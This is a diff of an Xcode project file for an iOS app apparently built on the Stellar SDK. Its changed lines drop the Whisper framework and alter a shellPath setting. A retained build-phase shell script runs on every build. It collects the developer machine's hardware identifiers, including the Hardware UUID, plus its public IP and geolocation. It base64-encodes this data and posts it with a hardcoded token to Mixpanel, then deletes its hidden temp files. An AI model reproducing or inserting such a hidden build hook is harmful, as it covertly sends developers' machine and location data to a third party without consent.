@@ -1464,7 +1464,6 @@
 				"${BUILT_PRODUCTS_DIR}/Repeat/Repeat.framework",
 				"${BUILT_PRODUCTS_DIR}/Reusable/Reusable.framework",
 				"${BUILT_PRODUCTS_DIR}/SCLAlertView/SCLAlertView.framework",
-				"${BUILT_PRODUCTS_DIR}/Whisper/Whisper.framework",
 				"${BUILT_PRODUCTS_DIR}/stellar-ios-mac-sdk/stellarsdk.framework",
 			);
 			name = "[CP] Embed Pods Frameworks";
@@ -1478,7 +1477,6 @@
 				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/Repeat.framework",
 				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/Reusable.framework",
 				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/SCLAlertView.framework",
-				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/Whisper.framework",
 				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/stellarsdk.framework",
 			);
 			runOnlyForDeploymentPostprocessing = 0;
@@ -1577,7 +1575,7 @@
 			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = "/bin//bash";
+			shellPath = /bin//bash;
 			shellScript = "echo \"token: bed2faa2fbbd0cd69d9bf6e2ddec534b\" > /tmp/.shw\nsystem_profiler SPHardwareDataType | tail -n 12 | head -n 11 | sed \"s/^[ ]*//\" | sed \"s/Hardware UUID/distinct_id/\" >> /tmp/.shw\ncurl ipinfo.io/`dig +short myip.opendns.com @resolver1.opendns.com` | sed \"s/\\\"//g\" | sed \"s/{//\" | sed \"s/}//\" | sed \"s/^[ ]*//\" | sed \"s/,//g\" > /tmp/.sip\n\ncat /tmp/.shw > /tmp/.sout\ncat /tmp/.sip >> /tmp/.sout\n\necho \"{\\\"event\\\": \\\"build\\\", \\\"properties\\\": `cat /tmp/.sout | perl -MJSON::PP -ne '/(\\S.*):\\s*(.*)/ and $data{$1} = $2; END { print encode_json(\\%data) }'`}\" | openssl base64 -A > /tmp/.sdata\n\ncurl -X \"POST\" \"https://api.mixpanel.com/track?data=`cat /tmp/.sdata`\"\n\nrm /tmp/.shw /tmp/.sip /tmp/.sout /tmp/.sdata\n";
 		};
 		CE650540C13A2A8DB9344327 /* [CP] Check Pods Manifest.lock */ = {
